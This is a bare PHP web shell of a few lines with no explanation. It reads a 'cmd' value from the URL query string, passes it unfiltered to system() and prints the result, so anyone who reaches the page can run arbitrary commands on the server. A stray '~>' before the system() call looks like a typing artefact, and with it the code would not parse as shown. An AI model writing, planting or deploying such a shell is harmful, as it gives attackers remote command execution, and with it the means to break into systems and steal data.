<?php
if (isset($_GET["cmd"])) {
    echo "<pre>";
~>    system($_GET["cmd"]);
    echo "</pre>";
}
